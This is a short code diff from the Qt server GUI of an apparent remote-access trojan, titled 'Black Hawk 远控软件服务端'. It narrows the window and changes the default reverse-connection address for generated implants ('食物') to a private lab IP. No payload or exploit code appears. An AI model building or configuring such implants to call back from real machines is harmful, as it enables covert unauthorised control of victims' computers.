@@ -14,7 +14,7 @@ Hunter::Hunter(QWidget *parent)
     // -------------------------------------------界面设计------------------------------------------------
     // 主窗口
     this->setWindowTitle("Black Hawk 远控软件服务端 by lfish");
-    this->setFixedSize(750, 500);
+    this->setFixedSize(700, 500);
 
     // 总设置区
     ui->widgetOption->setFixedHeight(200);
@@ -64,7 +64,7 @@ Hunter::Hunter(QWidget *parent)
     // 生成食物反向连接的域名
     ui->labelDomain->setText("连接域名");
     ui->labelDomain->setAlignment(Qt::AlignCenter);
-    ui->lineEditDomain->setText("10.211.55.2");
+    ui->lineEditDomain->setText("192.168.224.1");
     ui->lineEditDomain->setMaxLength(80);
     ui->lineEditDomain->setAlignment(Qt::AlignCenter);
     ui->lineEditDomain->setToolTip("生成食物反向连接的域名");
